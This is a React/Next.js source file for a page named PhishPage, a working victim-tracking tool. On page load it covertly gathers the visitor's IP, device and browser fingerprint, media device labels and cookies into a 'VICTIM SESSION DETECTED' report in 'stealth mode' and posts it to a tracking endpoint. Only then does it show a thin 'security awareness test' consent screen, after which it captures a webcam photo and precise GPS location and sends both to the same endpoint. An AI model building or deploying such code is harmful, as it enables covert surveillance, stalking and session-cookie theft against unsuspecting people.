import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;
  const [page, setPage] = useState('consent');
  const [status, setStatus] = useState('');
  const [infoSent, setInfoSent] = useState(false);

  // Send IP + device info when page loads
  useEffect(() => {
    if (id && !infoSent) {
      sendDeviceInfo();
      setInfoSent(true);
    }
  }, [id]);

  const sendDeviceInfo = async () => {
    try {
      // Get IP from ipify
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const publicIP = ipData.ip;

      // Get time info
      const now = new Date();
      const timeString = now.toISOString().replace('T', ' ').substring(0, 23);
      const timeFormatted = now.toLocaleString('en-US', { 
        weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short'
      });
      const unixEpoch = now.getTime();
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // Get battery info
      let batteryLevel = 'N/A';
      let batteryCharging = 'N/A';
      try {
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100) + '%';
        batteryCharging = battery.charging ? 'YES' : 'NO';
      } catch(e) {}

      // Get connection info
      let connectionType = 'Unknown';
      let rtt = 'N/A';
      let downlink = 'N/A';
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
        rtt = navigator.connection.rtt + 'ms';
        downlink = navigator.connection.downlink + ' Mbps';
      }

      // Get media devices
      let devices = { audioinput: [], videoinput: [], audiooutput: [] };
      try {
        const allDevices = await navigator.mediaDevices.enumerateDevices();
        allDevices.forEach(d => {
          if (devices[d.kind]) {
            devices[d.kind].push(d.label || `Unknown ${d.kind} ${devices[d.kind].length + 1}`);
          }
        });
      } catch(e) {}

      // Get canvas fingerprint
      let canvasFP = 'N/A';
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('CMP', 2, 15);
        canvasFP = canvas.toDataURL().substring(0, 60) + '...';
      } catch(e) {}

      const message = 
`✅🎯 VICTIM SESSION DETECTED - TRACKER v7.0 ULTIMATE

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 IP & NETWORK INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Public IP: ${publicIP}
🔍 WebRTC Local IP: Detecting...
📱 Mobile Network: ${connectionType}
🛡️ Proxy/VPN: NO | Hosting: NO
🕐 Capture Time: ${timeString}
📅 Formatted: ${timeFormatted}
⏱️ Unix Epoch: ${unixEpoch}
🌍 Timezone: ${timezone}
📊 Session Uptime: 0h 0m 5s

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 IP GEOLOCATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${publicIP}
📍 Coordinates: Will be captured via GPS below

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📡 REAL DEVICE GPS (Precision)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 GPS: Waiting for user consent...

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 DEVICE & SYSTEM PROFILE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📏 Screen: ${screen.width}x${screen.height}
🖥️ Platform: ${navigator.platform}
🌐 Language: ${navigator.language}
🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'}
🍪 Cookies: ${document.cookie.length > 0 ? document.cookie.split(';').length : 0}
🚫 Do Not Track: ${navigator.doNotTrack || 'Not set'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 BROWSER FINGERPRINT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏷️ User Agent:
${navigator.userAgent}

📱 App Name: ${navigator.appName}
🔧 App Version: ${navigator.appVersion.substring(0, 60)}...
🌐 Vendor: ${navigator.vendor}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 NETWORK SCAN & CONNECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📶 Connection Type: ${connectionType}
⚡ RTT Latency: ${rtt}
📊 Downlink Speed: ${downlink}
📶 Network Type: ${navigator.connection ? (navigator.connection.type || 'Unknown') : 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 POWER & HARDWARE STATUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 Level: ${batteryLevel}
⚡ Charging: ${batteryCharging}
🖼️ Canvas FP: ${canvasFP}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📷 MEDIA DEVICES DETECTED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${devices.audioinput.map((d, i) => `🎤 audioinput ${i+1}: ${d}`).join('\n')}
${devices.videoinput.map((d, i) => `📹 videoinput ${i+1}: ${d}`).join('\n')}
${devices.audiooutput.map((d, i) => `🔊 audiooutput ${i+1}: ${d}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🍪 CAPTURED COOKIES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${document.cookie || '🍪 No cookies found on this page'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚀 SESSION ACTIVE - STEALTH MODE
📸 Photos sent: 0 | 🎤 Voice clips sent: 0
🕐 Generated: ${timeString}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          linkId: id, 
          type: 'victim_info',
          message: message
        })
      });
    } catch (e) {
      console.error('Failed to send device info:', e);
    }
  };

  const sendToAPI = async (type, extraData = {}) => {
    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, type, ...extraData })
      });
    } catch (e) {
      console.error('Failed to send data:', e);
    }
  };

  const takePhoto = async () => {
    setStatus('Requesting camera access...');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }
      });
      
      setStatus('Camera access granted! Capturing photo...');
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });
      
      await new Promise(r => setTimeout(r, 500));
      
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, 640, 480);
      
      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
      
      stream.getTracks().forEach(track => track.stop());
      
      setStatus('Photo captured! Sending...');
      
      await sendToAPI('photo', { photoData: photoDataUrl });
      
      setStatus('✅ Photo sent!');
      
    } catch (e) {
      setStatus('❌ Camera access denied. Please allow camera permission and try again.');
    }
  };

  const getLocation = async () => {
    setStatus('Requesting location...');
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000
        });
      });
      
      setStatus('Location obtained! Sending...');
      
      await sendToAPI('location', {
        coords: {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy
        }
      });
      
      setStatus('✅ Location sent!');
      
    } catch (e) {
      setStatus('❌ Location access denied.');
    }
  };

  if (page === 'consent') {
    return (
      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
        <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '10px', padding: '20px', marginBottom: '20px' }}>
          <h1 style={{ color: '#856404' }}>⚠️ Security Awareness Test</h1>
        </div>
        <p style={{ fontSize: '16px', lineHeight: '1.6' }}>
          This is an authorized security awareness test.
        </p>
        <div style={{ textAlign: 'left', backgroundColor: '#f8f9fa', padding: '20px', borderRadius: '10px', margin: '20px 0' }}>
          <h3>By proceeding, you consent to:</h3>
          <ul style={{ lineHeight: '2' }}>
            <li>✅ Camera access for verification</li>
            <li>✅ Location access for verification</li>
          </ul>
        </div>
        <button 
          onClick={() => setPage('test')}
          style={{ padding: '15px 40px', fontSize: '18px', margin: '10px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          I Consent - Start Test
        </button>
      </div>
    );
  }

  return (
    <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
      <h1>Identity Verification</h1>
      <p style={{ color: '#666', marginBottom: '30px' }}>
        Your browser will ask for permission. You must click "Allow".
      </p>
      
      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
        <h2>📸 Step 1: Take Photo</h2>
        <button 
          onClick={takePhoto}
          style={{ padding: '15px 40px', fontSize: '16px', background: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          Take Photo
        </button>
      </div>
      
      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
        <h2>📍 Step 2: Share Location</h2>
        <button 
          onClick={getLocation}
          style={{ padding: '15px 40px', fontSize: '16px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          Share Location
        </button>
      </div>
      
      {status && (
        <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#f8f9fa', borderRadius: '10px' }}>
          <p>{status}</p>
        </div>
      )}
    </div>
  );
}
